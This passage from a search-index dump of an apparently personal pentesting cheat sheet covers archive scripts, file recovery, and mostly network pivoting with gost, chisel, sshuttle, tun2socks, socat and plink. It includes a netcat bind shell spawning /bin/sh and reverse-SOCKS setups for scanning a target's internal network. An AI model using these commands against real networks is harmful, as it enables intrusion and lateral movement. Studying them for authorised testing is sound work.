&gt;&gt; unzip.vbs echo Set objShell = Nothing &gt;&gt; unzip.vbs . | . ",
    "url": "http://localhost:4000/#file--compression---archive--windows--unzip",
    "relUrl": "/#file--compression---archive--windows--unzip"
  },"429": {
    "doc": "ftf-hacksheet",
    "title": "Zip",
    "content": ". | VBScript to be run with cscript //B //T:180 //Nologo zip.vbs &quot;&lt;dest.zip&gt;&quot; &quot;&lt;orig-dir&gt;&quot;, inspired by this:echo Dim fso, strZip, strDir, objShell, intSrcItems, intSkipped, filesInDir &gt; zip.vbs echo Set fso = WScript.CreateObject(\"Scripting.FileSystemObject\") &gt;&gt; zip.vbs echo strZip = fso.GetAbsolutePathName(WScript.Arguments.Item(0)) &gt;&gt; zip.vbs echo strDir = fso.GetAbsolutePathName(WScript.Arguments.Item(1)) &gt;&gt; zip.vbs echo WScript.Echo \"Zipping \" ^&amp; strDir ^&amp; \" into \" ^&amp; strZip &gt;&gt; zip.vbs echo With fso.OpenTextFile(strZip, 2, True) &gt;&gt; zip.vbs echo .Write \"PK\" ^&amp; Chr(5) ^&amp; Chr(6) ^&amp; String(18, Chr(0)) &gt;&gt; zip.vbs echo .Close &gt;&gt; zip.vbs echo End With &gt;&gt; zip.vbs echo Set objShell = WScript.CreateObject(\"Shell.Application\") &gt;&gt; zip.vbs echo Set filesInDir = objShell.NameSpace(strDir).Items &gt;&gt; zip.vbs echo intSkipped = 0 &gt;&gt; zip.vbs echo For Each objItem in filesInDir &gt;&gt; zip.vbs echo If objItem.IsFolder Then &gt;&gt; zip.vbs echo If objShell.NameSpace(objItem.Path).Items.Count = 0 Then &gt;&gt; zip.vbs echo intSkipped = intSkipped + 1 &gt;&gt; zip.vbs echo End If &gt;&gt; zip.vbs echo End If &gt;&gt; zip.vbs echo Next &gt;&gt; zip.vbs echo objShell.NameSpace(strZip).CopyHere(filesInDir), 4 + 16 + 1024 &gt;&gt; zip.vbs echo intSrcItems = filesInDir.Count - intSkipped &gt;&gt; zip.vbs echo Set filesInDir = Nothing &gt;&gt; zip.vbs echo Do Until objShell.NameSpace(strZip).Items.Count = intSrcItems &gt;&gt; zip.vbs echo WScript.sleep 200 &gt;&gt; zip.vbs echo Loop &gt;&gt; zip.vbs echo Set objShell = Nothing &gt;&gt; zip.vbs echo Set fso = Nothing &gt;&gt; zip.vbs . | . ",
    "url": "http://localhost:4000/#file--compression---archive--windows--zip",
    "relUrl": "/#file--compression---archive--windows--zip"
  },"430": {
    "doc": "ftf-hacksheet",
    "title": "Recovery",
    "content": " ",
    "url": "http://localhost:4000/#file--recovery",
    "relUrl": "/#file--recovery"
  },"431": {
    "doc": "ftf-hacksheet",
    "title": "Ext4",
    "content": " ",
    "url": "http://localhost:4000/#file--recovery--ext4",
    "relUrl": "/#file--recovery--ext4"
  },"432": {
    "doc": "ftf-hacksheet",
    "title": "ext4magic",
    "content": ". | Site - Recover deleted files (ref) | Dump the journal (optional):# Recommended to avoid overriding debugfs -R \"dump &lt;8&gt; &lt;sdnN&gt;.jnl\" /dev/&lt;sdnN&gt; . | Unmount partition:umount /dev/&lt;sdnN&gt; . | List deleted files in last 6 hours:# Remove -j &lt;jnl&gt; if no journal dump ext4magic /dev/&lt;sdnN&gt; -a $(date -d \"-6hours\" +%s) -f &lt;inspect/folder&gt; -j &lt;sdnN&gt;.jnl -l # -f is the path from &lt;sdnN&gt; root . | Recover deleted files in last 6 hours:ext4magic /dev/&lt;sdnN&gt; -a $(date -d \"-6hours\" +%s) -f &lt;inspect/folder&gt; -j &lt;sdnN&gt;.jnl -r -d &lt;dir-to-save&gt; # Use -m instead of -r for &lt; 100% . | . ",
    "url": "http://localhost:4000/#file--recovery--ext4--ext4magic",
    "relUrl": "/#file--recovery--ext4--ext4magic"
  },"433": {
    "doc": "ftf-hacksheet",
    "title": ".DS_Store",
    "content": " ",
    "url": "http://localhost:4000/#file--recovery---ds_store",
    "relUrl": "/#file--recovery---ds_store"
  },"434": {
    "doc": "ftf-hacksheet",
    "title": "Python-dsstore",
    "content": ". | Site - Parse .DS_Store cache content:python3 main.py .DS_Store | awk '!x[$0]++' # Removes duplicates . | . ",
    "url": "http://localhost:4000/#file--recovery---ds_store--python-dsstore",
    "relUrl": "/#file--recovery---ds_store--python-dsstore"
  },"435": {
    "doc": "ftf-hacksheet",
    "title": "Signatures",
    "content": ". | List of file signatures | . ",
    "url": "http://localhost:4000/#file--signatures",
    "relUrl": "/#file--signatures"
  },"436": {
    "doc": "ftf-hacksheet",
    "title": "Location Common Tools",
    "content": " ",
    "url": "http://localhost:4000/#location-common-tools",
    "relUrl": "/#location-common-tools"
  },"437": {
    "doc": "ftf-hacksheet",
    "title": "Windows",
    "content": " ",
    "url": "http://localhost:4000/#location-common-tools--windows",
    "relUrl": "/#location-common-tools--windows"
  },"438": {
    "doc": "ftf-hacksheet",
    "title": "Official sites",
    "content": ". | Wayback machine has an entry for http://support.microsoft.com/kb/927229 which contains many old tools that can be downloaded, including whoami, setx, and pulist (+ others for drivers, etc) | SysInternals (maybe the original) may contain the rest of the tools (including schtasks) | . ",
    "url": "http://localhost:4000/#location-common-tools--windows--official-sites",
    "relUrl": "/#location-common-tools--windows--official-sites"
  },"439": {
    "doc": "ftf-hacksheet",
    "title": "PLINK.exe",
    "content": ". | Kali - Incompatible: locate plink.exe | WinXP usable + OpenSSH usable: w32old | All others (unchecked): w32 - w64 | Official page | . ",
    "url": "http://localhost:4000/#location-common-tools--windows--plink-exe",
    "relUrl": "/#location-common-tools--windows--plink-exe"
  },"440": {
    "doc": "ftf-hacksheet",
    "title": "REG.exe and other admin tools",
    "content": ". | saule-spb.ru | . ",
    "url": "http://localhost:4000/#location-common-tools--windows--reg-exe-and-other-admin-tools",
    "relUrl": "/#location-common-tools--windows--reg-exe-and-other-admin-tools"
  },"441": {
    "doc": "ftf-hacksheet",
    "title": "Linux",
    "content": " ",
    "url": "http://localhost:4000/#location-common-tools--linux",
    "relUrl": "/#location-common-tools--linux"
  },"442": {
    "doc": "ftf-hacksheet",
    "title": "static-get",
    "content": ". | Script - s.minos.io static builds:# Search static-get -s &lt;search-pkg&gt; # Use the &lt;pkg.tar.xz&gt; below # Download static-get &lt;pkg-from-search-results&gt; # -o &lt;dir&gt; - Set download directory . | . ",
    "url": "http://localhost:4000/#location-common-tools--linux--static-get",
    "relUrl": "/#location-common-tools--linux--static-get"
  },"443": {
    "doc": "ftf-hacksheet",
    "title": "Port Redirection",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection",
    "relUrl": "/#port-redirection"
  },"444": {
    "doc": "ftf-hacksheet",
    "title": "Scanner Configuration / Fix",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--scanner-configuration---fix",
    "relUrl": "/#port-redirection--scanner-configuration---fix"
  },"445": {
    "doc": "ftf-hacksheet",
    "title": "Nmap",
    "content": ". | Use gost to create a SOCKS tunnel + tun2socks to create a TUN and run nmap with -e &lt;tun&gt; (allows UDP + SYN Scan) | Alternatively use graftcp or proxychains for TCP CONNECT scan (-sT) only in unprivileged mode (--unprivileged), see | The builtin alternative is to use the --proxies flag though note it is experimental and limited to SOCKS4 or HTTP proxy only for NSE scripts, or ncat in listen mode with proxy flags to a SOCKS5 (TCP only) | . ",
    "url": "http://localhost:4000/#port-redirection--scanner-configuration---fix--nmap",
    "relUrl": "/#port-redirection--scanner-configuration---fix--nmap"
  },"446": {
    "doc": "ftf-hacksheet",
    "title": "VPN",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--vpn",
    "relUrl": "/#port-redirection--vpn"
  },"447": {
    "doc": "ftf-hacksheet",
    "title": "Gost",
    "content": ". | Get the binaries (or my changes) | Supports TUN/TAP tunnels (admin in both sides required) | TODO - Check if gost TUN to SOCKS is possible by setting the routing table as showed in the SSH VPN section | Fallback to reverse-SOCKS-tunnel + use tun2socks (faster) or graftcp | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--gost",
    "relUrl": "/#port-redirection--vpn--gost"
  },"448": {
    "doc": "ftf-hacksheet",
    "title": "SSHuttle",
    "content": ". | Repository | Python and SSH required in the target | Route all the 192.168.1.0 traffic through the ssh server:sshuttle --dns -r &lt;user&gt;@&lt;ip&gt; 192.168.1.0/24 . | Only tproxy method supports UDP | Reverse tunnels require some fiddling: . | Reverse SOCKS | Double sshuttle | . | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--sshuttle",
    "relUrl": "/#port-redirection--vpn--sshuttle"
  },"449": {
    "doc": "ftf-hacksheet",
    "title": "Tfunnel",
    "content": ". | Repository | C++ Replacement for sshuttle --method=tproxy | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--tfunnel",
    "relUrl": "/#port-redirection--vpn--tfunnel"
  },"450": {
    "doc": "ftf-hacksheet",
    "title": "SSH",
    "content": ". | Admin privileges in both sides required | See how to do it - also here - and here | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--ssh",
    "relUrl": "/#port-redirection--vpn--ssh"
  },"451": {
    "doc": "ftf-hacksheet",
    "title": "DSVPN",
    "content": ". | Project - Configuration | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--dsvpn",
    "relUrl": "/#port-redirection--vpn--dsvpn"
  },"452": {
    "doc": "ftf-hacksheet",
    "title": "TinyVPN",
    "content": ". | Project - Has builtin FEC | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--tinyvpn",
    "relUrl": "/#port-redirection--vpn--tinyvpn"
  },"453": {
    "doc": "ftf-hacksheet",
    "title": "Leaf",
    "content": ". | Project | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--leaf",
    "relUrl": "/#port-redirection--vpn--leaf"
  },"454": {
    "doc": "ftf-hacksheet",
    "title": "n2n",
    "content": ". | Project - Peer to Peer VPN | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--n2n",
    "relUrl": "/#port-redirection--vpn--n2n"
  },"455": {
    "doc": "ftf-hacksheet",
    "title": "Iodine",
    "content": ". | Admin privileges in both sides required | Tunnel through DNS | Site | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--iodine",
    "relUrl": "/#port-redirection--vpn--iodine"
  },"456": {
    "doc": "ftf-hacksheet",
    "title": "Hans",
    "content": ". | Admin privileges in both sides required | Tunnel through ICMP | Respository | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--hans",
    "relUrl": "/#port-redirection--vpn--hans"
  },"457": {
    "doc": "ftf-hacksheet",
    "title": "Socat",
    "content": ". | Admin privileges in both sides required | Tunnel through SSL | How to - also here - and here | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--socat",
    "relUrl": "/#port-redirection--vpn--socat"
  },"458": {
    "doc": "ftf-hacksheet",
    "title": "Linux Tunnels",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--vpn--linux-tunnels",
    "relUrl": "/#port-redirection--vpn--linux-tunnels"
  },"459": {
    "doc": "ftf-hacksheet",
    "title": "IP-to-IP",
    "content": ". | Admin privileges in both sides required | How to | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--linux-tunnels--ip-to-ip",
    "relUrl": "/#port-redirection--vpn--linux-tunnels--ip-to-ip"
  },"460": {
    "doc": "ftf-hacksheet",
    "title": "GRE tunnel",
    "content": ". | Admin privileges in both sides required | How to | . ",
    "url": "http://localhost:4000/#port-redirection--vpn--linux-tunnels--gre-tunnel",
    "relUrl": "/#port-redirection--vpn--linux-tunnels--gre-tunnel"
  },"461": {
    "doc": "ftf-hacksheet",
    "title": "SOCKS / Dynamic",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic",
    "relUrl": "/#port-redirection--socks---dynamic"
  },"462": {
    "doc": "ftf-hacksheet",
    "title": "Tunnel Creation",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation"
  },"463": {
    "doc": "ftf-hacksheet",
    "title": "Gost",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost"
  },"464": {
    "doc": "ftf-hacksheet",
    "title": "Binaries",
    "content": ". | Get the binaries | Or just compile it: make linux-amd64 | auto schemas (not specifying the protocol/transport) for the endpoints almost always achieve the fastest results | Set the ?udp=true flag on the listener and last http/socks forwarder for UDP-over-TCP | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--binaries",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--binaries"
  },"465": {
    "doc": "ftf-hacksheet",
    "title": "Bypass Conditions",
    "content": ". | Use the ?bypass flag with a file or a list of IPs, CIDR and domains with wildcards | See the file structure on the docs | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--bypass-conditions",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--bypass-conditions"
  },"466": {
    "doc": "ftf-hacksheet",
    "title": "Reverse SOCKS",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks"
  },"467": {
    "doc": "ftf-hacksheet",
    "title": "Through unavoidable intermediate Proxies",
    "content": ". | The method is almost the same as below:# Example: Must tunnel through PAC proxy pacproxy -c &lt;pac.file&gt; -l 127.0.0.1:8008 # Just add this proxy as first forwarder gost -L 127.0.0.1:8888 -- -L rtcp://127.0.0.1:8010/127.0.0.1:8888 -F http://127.0.0.1:8008 -F auto+auto://&lt;ip&gt;:8080 # Change to http2 if supported by the # intermediate proxy . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--through-unavoidable-intermediate-proxies",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--through-unavoidable-intermediate-proxies"
  },"468": {
    "doc": "ftf-hacksheet",
    "title": "Over SSH",
    "content": ". | Docs - Auth docs - Heartbeat docs | Prefer QUIC/UDP-protos: Are around 10 times faster than TCP ones | Prefer TLS+Websockets/HTTP 2.0: are faster | Note that the SSH server can be a non-gost one (like sshd) | Server (using my changes):# The server will be the client gost -L socks5://127.0.0.1:1080?udp=true -F relay://127.0.0.1:8010 -- -L forward+ssh://:2222 # The -- -L ... can be removed if using # a non-gost ssh server . | Client (using my changes):# The client will be the server gost -L relay://127.0.0.1:8888 -- -L rtcp://127.0.0.1:8010/127.0.0.1:8888 -F forward+ssh://&lt;ip&gt;:2222 # Relay performance flags: # ...relay://127.0.0.1:8888?nodelay=true # &amp;bind=true # ^ Relay only has bind=true in Gost v3 # SSH Heartbeat: # ...ssh://&lt;ip&gt;:2222?ping=60 # Non-gost SSH Authentication: # ...ssh://&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt;:2222 # or ssh://&lt;ip&gt;:2222?ssh_key=&lt;rsa&gt; . | relay appears to be faster than auto (nothing) or socks5 | forward+ssh automatically selects direct and reverse modes but only works as the last proxy | How it works: . | S1080 -&gt; S8010 -&gt; S2222 -&gt; C8888: | (S)erver listens in TCP 1080&amp;2222 | (C)lient listens in TCP 8888 and | C starts a TCP 8010 listener in S | via SSH (2222) redirected to 8888 | S 1080 port is redirected to 8010 | . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-ssh",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-ssh"
  },"469": {
    "doc": "ftf-hacksheet",
    "title": "Over QUIC",
    "content": ". | Docs - QUIC - Shadowsocks over KCP | If QUIC (UDP) gets slow/unreliable try KCP (UDP + improved latency vs bandwidth tradeoff + error correction), or TCP transport protocols like websockets or transports/protocols to disguise the servers as HTTP ones (ss+ohttp, obsf4, sni, socks5+h2 or just http) | Gost-SOCKS default transport is TLS, prefer Shadowsocks for security (UDP traffic not supported) | Server (using my changes):# The server will be the client gost -L socks5://127.0.0.1:1080?udp=true -F 127.0.0.1:8010 -- -L socks5+quic://:8080 . | Client - mSOCKS + keep-alive QUIC:# The client will be the server gost -L 127.0.0.1:8888?udp=true -- -L rtcp://127.0.0.1:8010/127.0.0.1:8888 -F socks5+quic://&lt;ip&gt;:8080?keepalive=true&amp;mbind=true # rudp + forward tricks don't work . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-quic",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-quic"
  },"470": {
    "doc": "ftf-hacksheet",
    "title": "Over Websockets",
    "content": ". | Server (using my changes):# The server will be the client gost -L socks5://127.0.0.1:1080?udp=true -F relay://127.0.0.1:8010?nodelay=true -- -L tls+ws://:8080?compression=true # Is ?enableCompression=true on Gost v3 . | Client:# The client will be the server gost -L relay://127.0.0.1:8888?nodelay=true -- -L rtcp://127.0.0.1:8010/127.0.0.1:8888 -F tls+ws://&lt;ip&gt;:8080?compression=true&amp;mbind=true # ^ Relay has bind=true in Gost v3 . | Check whether websocket multiplexing (mws) improves or worsens the performance | In my tests mws is very inconsistent when used to scan a single port | Use websockets over TLS on their own with wss or mwss | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-websockets",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--reverse-socks--over-websockets"
  },"471": {
    "doc": "ftf-hacksheet",
    "title": "Auto HTTP + Socks5 Proxy on Reverse Proxy",
    "content": ". | Use 2 auto listeners with an auto forwarder# On our server - Use one of the above gost -L 127.0.0.1:1080 -F auto://[...] # On Reverse Proxy - Using my changes gost -L 127.0.0.1:8888 -F 127.0.0.1:8010 -- -L 127.0.0.1:8010 # Test it with curl curl -x http://127.0.0.1:1080 &lt;site&gt; curl -x socks5://127.0.0.1:1080 &lt;site&gt; . | This tricks bypasses the case where the 8888 listener gets a Proxy CONNECT from any of the intermediate forwarders encapsulating Socks5 | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--auto-http---socks5-proxy-on-reverse-proxy",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--auto-http---socks5-proxy-on-reverse-proxy"
  },"472": {
    "doc": "ftf-hacksheet",
    "title": "Access the Client&#8217;s Network from Server",
    "content": ". | Using the SOCKS tunnel:# Server side - ncat (&gt;7.91) check: ncat --proxy 127.0.0.1:1080 --proxy-type socks5 -nv &lt;client-side-ip&gt; &lt;client-side-port&gt; # Server side - curl check: curl -s -x socks5://127.0.0.1:1080 -L http://&lt;client-http-server&gt; | w3m -T text/html # Server side - nmap/wireshark... # use tun2socks with TCP 1080 . | Bind-netcat (remove the appropriate client/server -L ... configuration):# Client side: nc -lnvp 8888 -e /bin/sh # Server side: nc -nv 127.0.0.1 8010 . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--access-the-client-s-network-from-server",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--access-the-client-s-network-from-server"
  },"473": {
    "doc": "ftf-hacksheet",
    "title": "Transparent Proxy",
    "content": ". | Docs - Linux only (requires iptables) | Transparently redirect all TCP and UDP traffic to a given network | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--gost--transparent-proxy",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--gost--transparent-proxy"
  },"474": {
    "doc": "ftf-hacksheet",
    "title": "Chisel",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--chisel",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--chisel"
  },"475": {
    "doc": "ftf-hacksheet",
    "title": "Binaries",
    "content": ". | Get the binaries from the releases | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--chisel--binaries",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--chisel--binaries"
  },"476": {
    "doc": "ftf-hacksheet",
    "title": "Reverse SOCKS5",
    "content": ". | The proxy is opened on the server-side | Server:# key: non-mandatory - put anything chisel server -p 8010 --socks5 --reverse --key test # Annotate the fingerprint value . | Client:# Put fingerprint in &lt;server-print&gt; chisel client --fingerprint \"&lt;server-print&gt;\" &lt;ip&gt;:8010 R:1080:socks # Proxy on port 1080 on server-side . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--chisel--reverse-socks5",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--chisel--reverse-socks5"
  },"477": {
    "doc": "ftf-hacksheet",
    "title": "PLINK.EXE",
    "content": ". | Forward SOCKS/Dynamic:plink -ssh -N -l &lt;usr&gt; -pw &lt;pass&gt; -D 1080 &lt;usr&gt;@&lt;ip&gt; . | Reverse SOCKS/Dynamic doesn&#8217;t seem to work in plink | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-creation--plink-exe",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-creation--plink-exe"
  },"478": {
    "doc": "ftf-hacksheet",
    "title": "Tunnel Usage",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-usage",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-usage"
  },"479": {
    "doc": "ftf-hacksheet",
    "title": "tun2socks",
    "content": ". | Creates a TUN interface (admin required) redirecting the traffic to a SOCKS5 server | Shadowsocks (ss) and Direct (direct) proxy modes are also supported | Get the binaries from the release page | Or use the BadVPN version (config) | TUN configuration (ref):ip tuntap add mode tun dev tun10 # Only these two lines are needed # if tun2socks was previously run: ip addr add 10.0.0.1/31 dev tun10 ip link set tun10 up . | Usage:# Use ss for shadowsocks tun2socks -device tun://tun10 -tcp-auto-tuning -loglevel warning -proxy socks5://127.0.0.1:1080 # direct just creates a tun proxying # to the system DNS/routes . | ss requires a cipher and pass, no-UDP:tun2socks -device tun://tun10 -loglevel warn -proxy ss://AEAD_CHACHA20_POLY1305:&lt;pass&gt;@127.0.0.1:1080 # Gost has a different cipher syntax # Same ss://&lt;cipher:pass&gt;@&lt;ip:port&gt; . | Nmap config:# The -n causes major speed-up nmap -sS -sU -sV -Pn [...] -e tun10 -n &lt;target-machine-ip&gt; . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-usage--tun2socks",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-usage--tun2socks"
  },"480": {
    "doc": "ftf-hacksheet",
    "title": "Ipio",
    "content": ". | Binaries - designed mainly for Brook server | Usage:ipio tun2socks5 -s 127.0.0.1:1080 --doNotChangeAnything # Configure the TUN as shown in the # tun2socks &gt; TUN configuration . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-usage--ipio",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-usage--ipio"
  },"481": {
    "doc": "ftf-hacksheet",
    "title": "Graftcp",
    "content": ". | Not based on LD_PRELOAD, works on static binaries | Get the binaries from the release page | Usage:# Remember to use TCP CONNECT scans mgraftcp --http_proxy &lt;ip:port&gt; --select_proxy_mode only_http_proxy -n &lt;cmd&gt; # --select_proxy_mode: Use for local addrs # -n - Proxy local addresses # --socks5 &lt;ip:p&gt; - Proxy via socks5 # --socks5_password &lt;pass&gt; # --socks5_username &lt;user&gt; . | Prior to v0.4 . | Server# Run with sudo if sudoing graftcp graftcp-local -loglevel 3 -socks5 :1080 . | Client# -n proxies localhost (127.0.0.1) # making nmap ... 127.0.0.1 work graftcp -n &lt;command&gt; . | . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-usage--graftcp",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-usage--graftcp"
  },"482": {
    "doc": "ftf-hacksheet",
    "title": "ProxyChains",
    "content": ". | Hack based on LD_PRELOAD (linux) | Modify the last line of proxychains.conf to use the 1080 port, also check if using socks4 vs socks5 | You may want to uncomment quiet_mode | Use is as follow::: Python pip works proxychains_win32_x86.exe -f proxychains.conf &lt;program&gt; . | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-usage--proxychains",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-usage--proxychains"
  },"483": {
    "doc": "ftf-hacksheet",
    "title": "Browser",
    "content": ". | Unfortunately neither IE nor Edge seem to like the proxy settings, the only alternative appears to be downloading Firefox Portable and configure to use the socks5 proxy | . ",
    "url": "http://localhost:4000/#port-redirection--socks---dynamic--tunnel-usage--browser",
    "relUrl": "/#port-redirection--socks---dynamic--tunnel-usage--browser"
  },"484": {
    "doc": "ftf-hacksheet",
    "title": "Individual Ports",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--individual-ports",
    "relUrl": "/#port-redirection--individual-ports"
  },"485": {
    "doc": "ftf-hacksheet",
    "title": "Gost",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--gost",
    "relUrl": "/#port-redirection--individual-ports--gost"
  },"486": {
    "doc": "ftf-hacksheet",
    "title": "SSH",
    "content": ". | Docs - Auth | Note: forward mode only supports TCP | Forward TCP - SSH native:# Server gost -L forward+ssh://:2222 # Client gost -L tcp://127.0.0.1:8080/:80 -F forward+ssh://&lt;ip&gt;:2222?ping=60 . | Reverse UDP - SSH encapsulated:# Server -&gt; will be the client gost -L ssh://:2222 # Client -&gt; will be the server gost -L rudp://:5353/&lt;dns-ip&gt;:53 -F ssh://&lt;ip&gt;:2222?ping=60 # Ignore the log about SOCKS . | . ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--gost--ssh",
    "relUrl": "/#port-redirection--individual-ports--gost--ssh"
  },"487": {
    "doc": "ftf-hacksheet",
    "title": "Simple TCP/UDP Redirection - Direct",
    "content": ". | Docs | Forward TCP:gost -L tcp://127.0.0.1:3333/&lt;ip&gt;:1212 . | Reverse UDP:# Reverse requires a proxy listening gost -L rudp://:5353/&lt;dns-ip&gt;:53 -F &lt;ip&gt;:3355 . | Forward Tunnel over TLS:# Server gost -L tls://:8443/&lt;target-ip&gt;:80 # Client gost -L tcp://:8080 -F forward+tls://:8443 # Connect to client . | . ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--gost--simple-tcp-udp-redirection---direct",
    "relUrl": "/#port-redirection--individual-ports--gost--simple-tcp-udp-redirection---direct"
  },"488": {
    "doc": "ftf-hacksheet",
    "title": "Multiple TCP/UDP Redirection - Relay",
    "content": ". | Docs | Only port-forwarding/tunneling is supported (but you can bypass this with a reverse-tunnel + SOCKS5 wrap) | Port forwarding:# Server gost -L relay://:9999 # Client gost -L udp://:5353/&lt;dns&gt;:53 -L tcp://:8080/:80 -F relay://&lt;ip&gt;:9999?nodelay=true # UDP: C 5353 -&gt; S 9999 -&gt; &lt;dns&gt;:53 # TCP: C 8080 -&gt; S 9999 -&gt; S 80 . | Forward tunnel:# Server gost -L relay://:9999/&lt;dns&gt;:53 # Client gost -L udp://:5353 -L tcp://:8080 -F relay://&lt;ip&gt;:9999?nodelay=true # UDP: C 5353 -&gt; S 9999 -&gt; &lt;dns&gt;:53 # TCP: C 8080 -&gt; S 9999 -&gt; &lt;dns&gt;:53 . | The nodelay flag (default false) will only relay the connection to the server if data is received from the client | This means that simple port-pinging or connection won&#8217;t be transparently relayed unless the flag is true | . ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--gost--multiple-tcp-udp-redirection---relay",
    "relUrl": "/#port-redirection--individual-ports--gost--multiple-tcp-udp-redirection---relay"
  },"489": {
    "doc": "ftf-hacksheet",
    "title": "mr2",
    "content": ". | Binaries | Usage - Reverse port forwarding:# Server mr2 server -l :9999 -p password # Client mr2 client -s &lt;ip&gt;:9999 -p password -P 8888 -c 127.0.0.1:8080 # Server's port 8888 redirect to # client's 8080 . | Reverse directory listing:# Server mr2 server -l :9999 -p password # Client mr2 client -s &lt;ip&gt;:9999 -p password -P 8888 --clientPort 8080 --clientDirectory &lt;path&gt; # &lt;path&gt; will be accessible over # server's 8888 . | . ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--mr2",
    "relUrl": "/#port-redirection--individual-ports--mr2"
  },"490": {
    "doc": "ftf-hacksheet",
    "title": "Socat",
    "content": ". | Forward redirection (ref1, ref 2):# Local 8080 redirected to &lt;ip&gt;:80 socat TCP-LISTEN:8080 TCP:&lt;ip&gt;:80 # With DNS forwarding socat TCP-LISTEN:8080,fork SOCKS4A:127.0.0.1:&lt;ip&gt;:80,socksport=5678 . | . ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--socat",
    "relUrl": "/#port-redirection--individual-ports--socat"
  },"491": {
    "doc": "ftf-hacksheet",
    "title": "PLINK.exe",
    "content": ". | Reverse redirection:plink.exe -ssh -N -l &lt;user&gt; -pw &lt;pass&gt; -R 192.168.1.1:1212:127.0.0.1:6000 192.168.1.1 &lt;user&gt;@&lt;host&gt; . | . ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--plink-exe",
    "relUrl": "/#port-redirection--individual-ports--plink-exe"
  },"492": {
    "doc": "ftf-hacksheet",
    "title": "Rinetd",
    "content": ". | Project | Create the configuration (rinetd.conf):# lhost lport rhost rport &lt;lip&gt; 80 &lt;rip&gt; 80 . | Start in the foreground:rinetd -f -c rinetd.conf . | . ",
    "url": "http://localhost:4000/#port-redirection--individual-ports--rinetd",
    "relUrl": "/#port-redirection--individual-ports--rinetd"
  },"493": {
    "doc": "ftf-hacksheet",
    "title": "HTTP Proxy",
    "content": " ",
    "url": "http://localhost:4000/#port-redirection--http-proxy",
    "relUrl": "/#port-redirection--http-proxy"
  },"494": {
    "doc": "ftf-hacksheet",
    "title": "Gost",
